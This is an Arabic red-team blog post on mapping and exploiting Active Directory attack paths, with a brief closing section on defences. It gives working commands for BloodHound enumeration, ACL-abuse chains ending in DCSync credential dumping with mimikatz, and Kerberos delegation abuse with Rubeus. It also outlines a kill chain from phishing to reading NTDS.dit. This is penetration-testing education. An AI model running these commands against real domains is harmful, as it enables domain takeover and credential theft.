---
layout: blog
title: "مسارات الهجوم في Active Directory: منهجية الكشف والاستغلال من منظور Red Team"
date: 2026-04-04T15:44:36Z
category: "منهجية"
excerpt: "بيئة Active Directory ليست مجرد خدمة مصادقة، بل شبكة معقدة من العلاقات والصلاحيات التي تشكل مسارات خفية للتصعيد. فهم Attack Paths يعني رؤية الشبكة كما يراها المهاجم: سلسلة من القفزات المنطقية من نقطة الاختراق الأولى إلى Domain Admin. هذه المنهجية تحول عملية الاختبار من محاولات عشوائية إلى استراتيجية ممنهجة."
read_time: 8
tags: ["Active Directory", "Attack Paths", "BloodHound", "Privilege Escalation", "Red Team"]
slug: "ad-attack-paths"
image: "/OffsecAR/assets/images/blogs/ad-attack-paths.svg"
---

## فلسفة Attack Paths في بيئات AD

عندما ننظر إلى Active Directory من منظور هجومي، نتعامل مع Graph Structure ضخم. كل كائن (User، Computer، Group) هو Node، والعلاقات بينها (MemberOf، GenericAll، WriteDacl) هي Edges. المسار الهجومي ليس خطًا مستقيمًا، بل سلسلة من الصلاحيات المتداخلة.

المهاجم المحترف لا يبحث عن ثغرة واحدة كبيرة. يبحث عن تراكم صغير في الصلاحيات: حساب خدمة له Kerberoastable ticket، مجموعة لها GenericWrite على مجموعة أخرى، Computer Account له Unconstrained Delegation. كل نقطة ضعف منفصلة قد تبدو تافهة، لكن مجتمعة تصنع طريقًا سريعًا لـ Domain Compromise.

## منهجية Enumeration للمسارات

الخطوة الأولى دائمًا هي Mapping. أدوات مثل BloodHound غيرت قواعد اللعبة لأنها تحول البيانات الخام إلى علاقات مرئية. لكن الأداة وحدها لا تكفي، الفهم العميق للعلاقات هو المفتاح.

```powershell
# جمع البيانات باستخدام SharpHound
.\SharpHound.exe -c All --zipfilename ad_audit.zip

# أو الإصدار Python لبيئات Linux
bloodhound-python -d domain.local -u user -p pass -ns 10.10.10.10 -c all
```

بعد التحليل في BloodHound، ركز على Queries الأساسية:
- Shortest Paths to Domain Admins
- Kerberoastable Users with most privileges
- Computers with Unconstrained Delegation
- Users with DCSync Rights

لكن لا تتوقف عند Pre-built Queries. Custom Cypher Queries تكشف مسارات غير تقليدية:

```cypher
// البحث عن مستخدمين لهم صلاحيات على GPOs مرتبطة بـ Domain Controllers
MATCH (u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl]->(g:GPO)
MATCH (g)-[r2:GpLink]->(ou:OU)
MATCH (ou)-[r3:Contains*1..]->(c:Computer)-[r4:MemberOf*1..]->(g2:Group)
WHERE g2.name = 'DOMAIN CONTROLLERS@DOMAIN.LOCAL'
RETURN u,g,ou,c
```

## استغلال ACL Chains

أخطر المسارات هي ACL Abuse Chains. تخيل: لديك صلاحية GenericAll على User A، وهذا User عضو في Group B، والمجموعة لها WriteDacl على Domain Object. هذه ثلاث قفزات لـ DCSync.

```powershell
# الخطوة 1: تغيير كلمة مرور User A
$SecPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-ADAccountPassword -Identity userA -NewPassword $SecPassword -Reset

# الخطوة 2: إضافة صلاحية DCSync للمستخدم الحالي عبر User A
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackerUser -Rights DCSync -Credential $cred

# الخطوة 3: تنفيذ DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

أداة PowerView توفر مرونة كبيرة لاكتشاف هذه السلاسل:

```powershell
# البحث عن كل الصلاحيات التي يملكها مستخدم معين
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
    Where-Object {$_.SecurityIdentifier -match "^S-1-5-21-.*-[0-9]{4,}$"}
```

## مسارات Kerberos Delegation

Delegation في Kerberos يُنشئ مسارات جانبية خطيرة. Unconstrained Delegation يسمح لك بسرقة TGT لأي مستخدم يتصل بالجهاز، بينما Constrained Delegation يمكن استغلاله عبر Protocol Transition.

```bash
# كشف Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# استغلال عبر Rubeus
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# بعد الحصول على TGT
Rubeus.exe ptt /ticket:base64ticket
```

لـ Constrained Delegation مع Protocol Transition:

```bash
# الحصول على Service Ticket لأي مستخدم
Rubeus.exe s4u /user:serviceAccount$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

## بناء Kill Chain متكامل

المسار الهجومي الناجح يجمع تقنيات متعددة. مثال واقعي:

1. **Initial Access**: Phishing للحصول على Low-privileged User
2. **Enumeration**: اكتشاف أن هذا User له WriteDacl على Service Account
3. **Privilege Abuse**: إضافة SPN للـ Service Account
4. **Kerberoasting**: استخراج وكسر الـ Hash
5. **Lateral Movement**: Service Account له Local Admin على Server
6. **Credential Harvesting**: استخراج Credentials من LSASS
7. **Domain Escalation**: أحد الـ Credentials لمستخدم في Backup Operators
8. **Final Goal**: استخدام Backup Privileges لقراءة NTDS.dit

كل خطوة تبدو بسيطة، لكن الربط بينها يتطلب فهم عميق للعلاقات.

## الدفاع من منظور Attack Paths

فهم المسارات الهجومية يجعلك مدافعًا أفضل. ركز على:

- **Tier Model Implementation**: عزل Administrative Accounts
- **LAPS Deployment**: منع Lateral Movement عبر Local Admin passwords
- **Constrained Delegation Audit**: مراجعة كل حالات التفويض
- **ACL Hygiene**: إزالة Excessive Permissions
- **Monitoring Critical Paths**: تنبيهات فورية عند استخدام DCSync أو Golden Ticket

الأمان الحقيقي لا يأتي من سد ثغرة واحدة، بل من كسر السلاسل التي تربط المسارات.
